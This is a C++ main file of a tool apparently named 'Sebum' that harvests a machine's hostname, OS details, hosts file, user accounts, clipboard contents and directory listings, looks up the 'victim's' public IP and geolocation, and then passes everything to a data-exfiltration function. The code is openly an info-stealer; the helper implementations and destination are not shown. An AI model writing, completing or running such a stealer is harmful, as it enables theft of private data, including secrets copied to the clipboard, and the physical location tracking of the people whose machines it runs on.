#include <iostream>
#include <fstream>
#include <vector>
#include <unordered_map>
#include <string>
#include <cstring>
#include <sstream>
#include <cstdlib>
#include <filesystem>
#include <sys/stat.h>

// clipboard management
#include <limits.h>
#include <X11/Xlib.h>

// internal includes
#include "headers/utils.h"

int main(int argc, char* argv[]) {

  /*
   *
   * PRINT A F* BANNER
   *
   */

  // Prints the Sebum banner

  Utils::printBanner();

  std::vector<std::string> dataList {};

  std::string osHostname {System::getOsHostname()};
  std::cout << "\n=============HOSTNAME INFORMATIONS=============\n"
            << osHostname
            << "===============================================\n";
  
  dataList.push_back(osHostname);


  std::string osInfos {System::getOsInfos()};
  std::cout << "\n================OS INFORMATIONS================\n"
            << osInfos
            << "===============================================\n";
  
  dataList.push_back(osInfos);


  std::string hostsInfos {System::getHostsFile()};
  std::cout << "\n==============HOSTS INFORMATIONS==============\n"
            << hostsInfos
            << "==============================================\n";
  
  dataList.push_back(hostsInfos);


  std::string currentUserInfos {System::getCurrentUserInfos()};
  std::cout << "\n===========CURRENT USER INFORMATIONS===========\n"
            << currentUserInfos
            << "===============================================\n";
  
  dataList.push_back(currentUserInfos);


  std::string allUsers {System::getAllUsers()};
  std::cout << "\n=================LIST OF USERS=================\n"
            << allUsers
            << "===============================================\n";
  
  dataList.push_back(allUsers);


  std::string clipboardContent {System::getClipboardContent()};
  std::cout << "\n===============CLIPBOARD CONTENT===============\n"
            << clipboardContent
            << "\n===============================================\n";
  
  dataList.push_back(clipboardContent);


  std::cout << "\n=============MAIN DIRECTORIES CONTENT=============\n";
  std::unordered_map<std::string, std::vector<std::string>> directoriesContent {System::getBasicDirectoryContent()};
  
  System::showBasicDirectoryContent(directoriesContent);
  std::cout << "===============================================\n";


  std::cout << "\n===============VICTIM'S IP INFOS===============\n";
  CURL *hnd {OutsideTheBox::init()};

  std::string victimIP {OutsideTheBox::getVictimsIp(hnd)};
  
  dataList.push_back(victimIP);

  std::string victimIPLocationInfos {OutsideTheBox::getVictimsIpLocationInfos(hnd, victimIP)};
  
  dataList.push_back(victimIPLocationInfos);

  if (victimIP != "None") {
    std::cout << "Victim's IP : " << victimIP << "\n\n"; 
  }

  if (victimIPLocationInfos != "None") {
    std::cout << "Victim's IP location : " << victimIPLocationInfos; 
  }


  std::vector<std::string> victimIPLocationLatLon {OutsideTheBox::getVictimsIpLatLon(victimIPLocationInfos)};
  std::string victimIPLocationLat {victimIPLocationLatLon[0]};
  std::string victimIPLocationLon {victimIPLocationLatLon[1]};
  dataList.push_back(victimIPLocationLat);
  dataList.push_back(victimIPLocationLon);

  for (int o {0}; o < victimIPLocationLatLon.size(); o++) {
    std::cout << "victimIPLocationLatLon[" << o << "] : " << victimIPLocationLatLon[o] << '\n';
  }
  std::cout << "victimIPLocationLat : " << victimIPLocationLat << '\n';
  std::cout << "victimIPLocationLon : " << victimIPLocationLon << '\n';
  
  std::string victimIPLocationMaps {OutsideTheBox::getVictimsIpLocationMaps(victimIPLocationLat, victimIPLocationLon)};
  dataList.push_back(victimIPLocationMaps);
  
  std::cout << "\n\n  -> " <<  victimIPLocationMaps << std::endl;

  std::string concatenatedDatas {Utils::concatenateVariables(dataList)}; 

  std::cout << "\n\n" << OutsideTheBox::dataExf(hnd, concatenatedDatas);
  std::cout  << "\n===============================================\n";

  OutsideTheBox::cleanup(hnd);

  return 0;
}